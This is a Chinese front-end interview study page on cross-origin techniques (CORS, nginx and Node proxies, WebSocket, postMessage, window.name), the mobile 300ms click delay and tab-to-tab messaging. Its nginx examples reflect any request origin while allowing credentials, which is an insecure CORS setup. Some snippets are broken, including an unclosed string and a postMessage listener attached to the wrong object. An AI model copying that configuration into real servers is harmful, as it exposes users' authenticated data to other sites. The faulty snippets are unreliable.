+ **<font style="color:rgb(44, 62, 80);">简单请求</font>**<font style="color:rgb(44, 62, 80);">：不会触发预检请求的称为简单请求。当请求满足以下条件时就是一个简单请求：</font>
    - <font style="color:rgb(44, 62, 80);">请求方法：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">GET</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">HEAD</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">POST</font><font style="color:rgb(44, 62, 80);">。</font>
    - <font style="color:rgb(44, 62, 80);">请求头：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Accept</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Accept-Language</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Content-Language</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Content-Type</font><font style="color:rgb(44, 62, 80);">。</font>
        * <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Content-Type</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">仅支持：</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">application/x-www-form-urlencoded</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">multipart/form-data</font><font style="color:rgb(44, 62, 80);">、</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">text/plain</font>
+ **<font style="color:rgb(44, 62, 80);">需预检请求</font>**<font style="color:rgb(44, 62, 80);">：当一个请求不满足以上简单请求的条件时，浏览器会自动向服务端发送一个</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">OPTIONS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">请求，通过服务端返回的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-*</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">判定请求是否被允许</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">CORS</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">引入了以下几个以</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-*</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">开头：</font>

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-Origin</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">表示允许的来源</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-Methods</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">表示允许的请求方法</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-Headers</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">表示允许的请求头</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-Credentials</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">表示允许携带认证信息</font>

<font style="color:rgb(44, 62, 80);">当请求符合响应头的这些条件时，浏览器才会发送并响应正式的请求</font>

**<font style="color:rgb(44, 62, 80);">4.3 nginx反向代理</font>**

<font style="color:rgb(44, 62, 80);">反向代理只需要服务端/后端支持，几乎不涉及前端改动，只用切换接口即可</font>

**<font style="color:rgb(44, 62, 80);">nginx 配置跨域，可以为全局配置和单个代理配置(两者不能同时配置)</font>**

1. **<font style="color:rgb(44, 62, 80);">全局配置</font>**<font style="color:rgb(44, 62, 80);">，在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">nginx.conf</font><font style="color:rgb(44, 62, 80);">文件中的</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">http</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">节点加入跨域信息</font>

```bash
http {
   跨域配置
  add_header 'Access-Control-Allow-Origin' '$http_origin' ;
  add_header 'Access-Control-Allow-Credentials' 'true' ;
  add_header 'Access-Control-Allow-Methods' 'PUT,POST,GET,DELETE,OPTIONS' ;
  add_header 'Access-Control-Allow-Headers' 'Content-Type,Content-Length,Authorization,Accept,X-Requested-With' ;
}
```

1. **<font style="color:rgb(44, 62, 80);">局部配置</font>**<font style="color:rgb(44, 62, 80);">（单个代理配置跨域）, 在路径匹配符中加入跨域信息</font>

```bash
server {
  listen       8080;
  server_name  server_name;

  charset utf-8;

  location / {
     这里配置单个代理跨域，跨域配置
    add_header 'Access-Control-Allow-Origin' '$http_origin' ;
    add_header 'Access-Control-Allow-Credentials' 'true' ;
    add_header 'Access-Control-Allow-Methods' 'PUT,POST,GET,DELETE,OPTIONS' ;
    add_header 'Access-Control-Allow-Headers' 'Content-Type,Content-Length,Authorization,Accept,X-Requested-With' ;

    配置代理 代理到本机服务端口
    proxy_pass http://127.0.0.1:9000;
    proxy_redirect   off;
    proxy_set_header Host $host:$server_port;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
  }
}
```

**<font style="color:rgb(44, 62, 80);">4.4 Node 中间层接口转发</font>**

```javascript
const router = require('koa-router')()
const rp = require('request-promise');

// 通过node中间层转发实现接口跨域
router.post('/github', async (ctx, next) => {
  let {category = 'trending',lang = 'javascript',limit,offset,period} = ctx.request.body 
  lang = lang || 'javascript'
  limit = limit || 30
  offset = offset || 0
  period = period || 'week'
  try {
    let res =  await rp({
      method: 'POST',
      // 跨域的接口
      uri: `https://e.juejin.cn/resources/github`,
      body: {
        category,
        lang,
        limit,
        offset,
        period
      },
      json: true
    })

    ctx.body = res
  } catch(error) {
    ctx.body = {
      code: -1,
      message: error.message || '查询github接口失败'
    }
  }
})

module.exports = router
```

**<font style="color:rgb(44, 62, 80);">4.5 Proxy</font>**

<font style="color:rgb(44, 62, 80);">如果是通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">vue-cli</font><font style="color:rgb(44, 62, 80);">脚手架工具搭建项目，我们可以通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">webpack</font><font style="color:rgb(44, 62, 80);">为我们起一个本地服务器作为请求的代理对象</font>

<font style="color:rgb(44, 62, 80);">通过该服务器转发请求至目标服务器，得到结果再转发给前端，但是最终发布上线时如果web应用和接口服务器不在一起仍会跨域</font>

<font style="color:rgb(44, 62, 80);">在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">vue.config.js</font><font style="color:rgb(44, 62, 80);">文件，新增以下代码</font>

```javascript
module.exports = {
  devServer: {
    host: '127.0.0.1',
    port: 8080,
    open: true,// vue项目启动时自动打开浏览器
    proxy: {
      '/api': { // '/api'是代理标识，用于告诉node，url前面是/api的就是使用代理的
        target: "http://xxx.xxx.xx.xx:8080", //目标地址，一般是指后台服务器地址
        changeOrigin: true, //是否跨域
        pathRewrite: { // pathRewrite 的作用是把实际Request Url中的'/api'用""代替
          '^/api': "" 
        }
      }
    }
  }
}
```

<font style="color:rgb(44, 62, 80);">通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">axios</font><font style="color:rgb(44, 62, 80);">发送请求中，配置请求的根路径</font>

```javascript
axios.defaults.baseURL = '/api'
```

<font style="color:rgb(44, 62, 80);">此外，还可通过服务端实现代理请求转发，以</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">express</font><font style="color:rgb(44, 62, 80);">框架为例</font>

```javascript
var express = require('express');
const proxy = require('http-proxy-middleware')
const app = express()
app.use(express.static(__dirname + '/'))
app.use('/api', proxy({ target: 'http://localhost:4000', changeOrigin: false
                      }));
module.exports = app
```

**<font style="color:rgb(44, 62, 80);">4.6 websocket</font>**

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">webSocket</font><font style="color:rgb(44, 62, 80);">本身不存在跨域问题，所以我们可以利用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">webSocket</font><font style="color:rgb(44, 62, 80);">来进行非同源之间的通信</font>

<font style="color:rgb(44, 62, 80);">原理：利用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">webSocket</font><font style="color:rgb(44, 62, 80);">的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">API</font><font style="color:rgb(44, 62, 80);">，可以直接</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">new</font><font style="color:rgb(44, 62, 80);">一个</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">socket</font><font style="color:rgb(44, 62, 80);">实例，然后通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ope</font><font style="color:rgb(44, 62, 80);">n方法内</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">send</font><font style="color:rgb(44, 62, 80);">要传输到后台的值，也可以利用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">message</font><font style="color:rgb(44, 62, 80);">方法接收后台传来的数据。后台是通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">new WebSocket.Server({port:3000})</font><font style="color:rgb(44, 62, 80);">实例，利用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">message</font><font style="color:rgb(44, 62, 80);">接收数据，利用</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">send</font><font style="color:rgb(44, 62, 80);">向客户端发送数据。具体看以下代码：</font>

```javascript
function socketConnect(url) {
  // 客户端与服务器进行连接
  let ws = new WebSocket(url); // 返回`WebSocket`对象，赋值给变量ws
  // 连接成功回调
  ws.onopen = e => {
    console.log('连接成功', e)
    ws.send('我发送消息给服务端'); // 客户端与服务器端通信
  }
  // 监听服务器端返回的信息
  ws.onmessage = e => {
    console.log('服务器端返回：', e.data)
    // do something
  }
  return ws; // 返回websocket对象
}
let wsValue = socketConnect('ws://121.40.165.18:8800'); // websocket对象
```

**<font style="color:rgb(44, 62, 80);">4.7 document.domain（不常用）</font>**

+ <font style="color:rgb(44, 62, 80);">该方式只能用于二级域名相同的情况下，比如</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.test.com</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">和</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">b.test.com</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">适用于该方式。</font>
+ <font style="color:rgb(44, 62, 80);">只需要给页面添加</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">document.domain = 'test.com'</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">表示二级域名都相同就可以实现跨域</font>

**<font style="color:rgb(44, 62, 80);">4.8 postMessage（不常用）</font>**

<font style="color:rgb(44, 62, 80);">在两个</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">origin</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">下分别部署一套页面</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">A</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">与</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">B</font><font style="color:rgb(44, 62, 80);">，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">A</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">页面通过</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">加载</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">B</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">页面并监听消息，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">B</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">页面发送消息</font>

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">这种方式通常用于获取嵌入页面中的第三方页面数据。一个页面发送消息，另一个页面判断来源并接收消息</font>

```javascript
// 发送消息端
window.parent.postMessage('message', 'http://test.com');
// 接收消息端
var mc = new MessageChannel();
mc.addEventListener('message', (event) => {
  var origin = event.origin || event.originalEvent.origin;
  if (origin === 'http://test.com') {
    console.log('验证通过')
  }
});
```

**<font style="color:rgb(44, 62, 80);">4.9 window.name（不常用）</font>**

<font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">主要是利用</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">window.name</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">页面跳转不改变的特性实现跨域，即</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">加载一个跨域页面，设置</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">window.name</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">，跳转到同域页面，可以通过</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">$('iframe').contentWindow.name</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">拿到跨域页面的数据</font>

**<font style="color:rgb(44, 62, 80);">实例说明</font>**

<font style="color:rgb(44, 62, 80);">比如有一个</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">www.example.com/a.html</font><font style="color:rgb(44, 62, 80);">页面。需要通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.html</font><font style="color:rgb(44, 62, 80);">页面里的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">js</font><font style="color:rgb(44, 62, 80);">来获取另一个位于不同域上的页面</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">www.test.com/data.html</font><font style="color:rgb(44, 62, 80);">中的数据。</font>

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">data.html</font><font style="color:rgb(44, 62, 80);">页面中设置一个</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">window.name</font><font style="color:rgb(44, 62, 80);">即可,代码如下</font>

```html
<script>
  window.name = "我是data.html中设置的a页面想要的数据";
</script>
```

+ <font style="color:rgb(44, 62, 80);">那么接下来问题来了，我们怎么把</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">data.html</font><font style="color:rgb(44, 62, 80);">页面载入进来呢，显然我们不能直接在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.html</font><font style="color:rgb(44, 62, 80);">页面中通过改变</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">window.location</font><font style="color:rgb(44, 62, 80);">来载入</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">data.html</font><font style="color:rgb(44, 62, 80);">页面（因为我们现在需要实现的是</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.html</font><font style="color:rgb(44, 62, 80);">页面不跳转,但是也能够获取到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">data.html</font><font style="color:rgb(44, 62, 80);">中的数据）</font>
+ <font style="color:rgb(44, 62, 80);">具体的实现其实就是在</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.html</font><font style="color:rgb(44, 62, 80);">页面中使用一个隐藏的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">来充当一个中间角色，由</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">去获取</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">data.html</font><font style="color:rgb(44, 62, 80);">的数据，然后</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.html</font><font style="color:rgb(44, 62, 80);">再去得到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">获取到的数据。</font>
+ <font style="color:rgb(44, 62, 80);">充当中间人的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">想要获取到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">data.html</font><font style="color:rgb(44, 62, 80);">中通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">window.name</font><font style="color:rgb(44, 62, 80);">设置的数据，只要要把这个</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">src</font><font style="color:rgb(44, 62, 80);">设置为</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">www.test.com/data.html</font><font style="color:rgb(44, 62, 80);">即可,然后</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.html</font><font style="color:rgb(44, 62, 80);">想要得到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">所获取到的数据，也就是想要得到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">widnow.name</font><font style="color:rgb(44, 62, 80);">的值，还必须把这个</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">src</font><font style="color:rgb(44, 62, 80);">设置成跟</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.html</font><font style="color:rgb(44, 62, 80);">页面同一个域才行，不然根据同源策略，</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">a.html</font><font style="color:rgb(44, 62, 80);">是不能访问到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">中的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">window.name</font><font style="color:rgb(44, 62, 80);">属性的</font>

```html
<!-- a.html中的代码 -->
<iframe id="proxy" src="http://www.test.com/data.html" style="display: none;" onload = "getData()"> 

<script>
  function getData(){
    var iframe = document.getElementById('proxy);
    iframe.onload = function(){
      var data = iframe.contentWindow.name;
      //上述即为获取iframe里的window.name也就是data.html页面中所设置的数据；
    }
    iframe.src = 'b.html'; //这里的b为随便的一个页面，只有与a.html同源就行，目的让a.html等访问到iframe里的东西，设置成about:blank也行
  }
</script>
```

<font style="color:rgb(44, 62, 80);">上面的代码只是最简单的原理演示代码，你可以对使用js封装上面的过程，比如动态的创建</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font><font style="color:rgb(44, 62, 80);">,动态的注册各种事件等等，当然为了安全，获取完数据后，还可以销毁作为代理的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">iframe</font>

**<font style="color:rgb(44, 62, 80);">4.10 扩展阅读</font>**

**<font style="color:rgb(44, 62, 80);">跨域与监控</font>**

<font style="color:rgb(44, 62, 80);">前端项目在统计前端报错监控时会遇到上报的内容只有</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Script Error</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">的问题。这个问题也是由同源策略引起。在</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);"><script></font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">标签上添加</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">crossorigin="anonymous"</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">并且返回的 JS 文件响应头加上</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-Origin: *</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">即可捕捉到完整的错误堆栈</font>

**<font style="color:rgb(44, 62, 80);">跨域与图片</font>**

<font style="color:rgb(44, 62, 80);">前端项目在图片处理时可能会遇到图片绘制到</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Canvas</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">上之后却不能读取像素或导出</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">base64</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">的问题。这个问题也是由同源策略引起。解决方式和上文相同，给图片添加</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">crossorigin="anonymous"</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">并在返回的图片文件响应头加上</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">Access-Control-Allow-Origin: *</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(44, 62, 80);">即可解决</font>

### [](https://www.123fe.net/docs/base/high-frequency.html#%E7%A7%BB%E5%8A%A8%E7%AB%AFh5%E7%82%B9%E5%87%BB%E6%9C%89300ms%E5%BB%B6%E8%BF%9F-%E8%AF%A5%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3)<font style="color:rgb(44, 62, 80);">移动端H5点击有300ms延迟，该如何解决</font>
**<font style="color:rgb(44, 62, 80);">解决方案</font>**

+ <font style="color:rgb(44, 62, 80);">禁用缩放，设置</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">meta</font><font style="color:rgb(44, 62, 80);">标签</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">user-scalable=no</font>
+ <font style="color:rgb(44, 62, 80);">现在浏览器方案</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">meta</font><font style="color:rgb(44, 62, 80);">中设置</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">content="width=device-width"</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">fastclick.js</font>

**<font style="color:rgb(44, 62, 80);">初期解决方案 fastClick</font>**

```plain
// 使用
window.addEventListener('load',()=>{
  FastClick.attach(document.body)
},false)
```

**<font style="color:rgb(44, 62, 80);">fastClick原理</font>**

+ <font style="color:rgb(44, 62, 80);">监听</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">touchend</font><font style="color:rgb(44, 62, 80);">事件（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">touchstart</font><font style="color:rgb(44, 62, 80);"> </font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">touchend</font><font style="color:rgb(44, 62, 80);">会先于</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">click</font><font style="color:rgb(44, 62, 80);">触发）</font>
+ <font style="color:rgb(44, 62, 80);">使用自定义</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font><font style="color:rgb(44, 62, 80);">事件模拟一个</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">click</font><font style="color:rgb(44, 62, 80);">事件</font>
+ <font style="color:rgb(44, 62, 80);">把默认的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">click</font><font style="color:rgb(44, 62, 80);">事件（</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">300ms</font><font style="color:rgb(44, 62, 80);">之后触发）禁止掉</font>

**<font style="color:rgb(44, 62, 80);">触摸事件的响应顺序</font>**

+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ontouchstart</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ontouchmove</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">ontouchend</font>
+ <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">onclick</font>

**<font style="color:rgb(44, 62, 80);">现代浏览器的改进</font>**

<font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">meta</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">中设置</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">content="width=device-width"</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);"> </font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">就不会有</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">300ms</font><font style="color:rgb(85, 85, 85);background-color:rgb(255, 249, 249);">的点击延迟了。浏览器认为你要在移动端做响应式布局，所以就禁止掉了</font>

```html
<head>
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
</head>
```

### [](https://www.123fe.net/docs/base/high-frequency.html#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%A1%B5%E5%A4%9A%E6%A0%87%E7%AD%BEtab%E9%80%9A%E8%AE%AF)<font style="color:rgb(44, 62, 80);">如何实现网页多标签tab通讯</font>
+ <font style="color:rgb(44, 62, 80);">通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">websocket</font>
    - <font style="color:rgb(44, 62, 80);">无跨域限制</font>
    - <font style="color:rgb(44, 62, 80);">需要服务端支持，成本高</font>
+ <font style="color:rgb(44, 62, 80);">通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">localStorage</font><font style="color:rgb(44, 62, 80);">同域通讯（推荐）</font>
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">同域</font><font style="color:rgb(44, 62, 80);">的</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">A</font><font style="color:rgb(44, 62, 80);">和</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">B</font><font style="color:rgb(44, 62, 80);">两个页面</font>
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">A</font><font style="color:rgb(44, 62, 80);">页面设置</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">localStorage</font>
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">B</font><font style="color:rgb(44, 62, 80);">页面可监听到</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">localStorage</font><font style="color:rgb(44, 62, 80);">值的修改</font>
+ <font style="color:rgb(44, 62, 80);">通过</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">SharedWorker</font><font style="color:rgb(44, 62, 80);">通讯</font>
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">SharedWorker</font><font style="color:rgb(44, 62, 80);">是</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">WebWorker</font><font style="color:rgb(44, 62, 80);">的一种</font>
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">WebWorker</font><font style="color:rgb(44, 62, 80);">可开启子进程执行</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">JS</font><font style="color:rgb(44, 62, 80);">，但不能操作</font><font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">DOM</font>
    - <font style="color:rgb(199, 37, 78);background-color:rgb(249, 242, 244);">SharedWorker</font><font style="color:rgb(44, 62, 80);">可单独开启一个进程，用于同域页面通讯</font>
